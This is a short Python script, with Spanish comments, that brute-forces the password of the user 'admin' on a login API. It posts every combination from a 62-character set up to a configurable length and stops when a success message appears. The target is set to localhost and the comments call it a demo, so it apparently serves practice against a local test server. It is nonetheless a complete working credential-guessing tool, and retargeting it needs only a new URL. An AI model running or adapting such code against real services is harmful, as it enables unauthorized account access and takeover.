import requests
import time
import itertools
import sys

# Config (edita aquí)
TARGET_USER = "admin"
MAX_LENGTH = 4  # Demo rápida: 2 + user "test"/"ab"
API_URL = "http://localhost:8000/login"
CHARSET = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"  # Números: "0123456789"
SUCCESS_MESSAGE = "Login successful"

def brute_force_attack():
    print("=== BRUTE FORCE MÍNIMO ===")
    print(f":User  {TARGET_USER} | Len: {MAX_LENGTH} | API: {API_URL}")
    print("Iniciando... (Ctrl+C)")
    print("-" * 30)

    start_time = time.time()
    attempts = 0

    for length in range(1, MAX_LENGTH + 1):
        for combo in itertools.product(CHARSET, repeat=length):
            password = ''.join(combo)
            attempts += 1
            
            payload = {"username": TARGET_USER, "password": password}
            try:
                response = requests.post(API_URL, json=payload, timeout=3)
                
                if response.status_code == 400:
                    continue
                
                response_text = response.text
                if response.status_code in [200, 202] and SUCCESS_MESSAGE in response_text:
                    elapsed = time.time() - start_time
                    print(f"\n=== ÉXITO! ===")
                    print(f"Pass: {password} | Int: {attempts} | Time: {elapsed:.1f}s")
                    return
            
            except:
                continue
            
            if attempts % 1000 == 0:
                elapsed = time.time() - start_time
                print(f"Prog: {attempts} (~{elapsed:.1f}s) | Ult: {password}")
    
    elapsed = time.time() - start_time
    print(f"\nNo hallado. Int: {attempts} | Time: {elapsed:.1f}s")

if __name__ == "__main__":
    if len(sys.argv) == 2:
        MAX_LENGTH = int(sys.argv[1])
    brute_force_attack()
